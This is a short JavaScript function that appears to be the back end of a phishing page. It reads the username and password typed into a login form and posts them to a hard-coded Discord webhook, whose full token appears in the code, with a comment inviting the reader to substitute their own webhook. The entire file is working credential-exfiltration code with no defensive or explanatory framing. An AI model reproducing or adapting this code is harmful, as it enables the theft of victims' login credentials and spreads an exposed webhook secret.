function sendData() {
    const user = document.getElementById("user").value;
    const pass = document.getElementById("pass").value;
    
    if (!user || !pass) {
        console.log("User or password is empty.");
        return; // Check if the input fields are not empty
    }
    
    const webhookURL = "https://discord.com/api/webhooks/1304152509845340251/74tE2N2FhHXsk6MB9EbzjHly-5ef9VQFX_qqdvppo9j3SotzWgaNS05ZY2tSJ8WIgso0"; // Replace with your Discord webhook URL

    const payload = {
        content: `**User:** ${user}\n**Pass:** ${pass}`
    };

    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.ok) {
            console.log("Data sent successfully!");
        } else {
            console.error("Failed to send data:", response.status, response.statusText);
        }
    })
    .catch(error => console.error("Error:", error));
}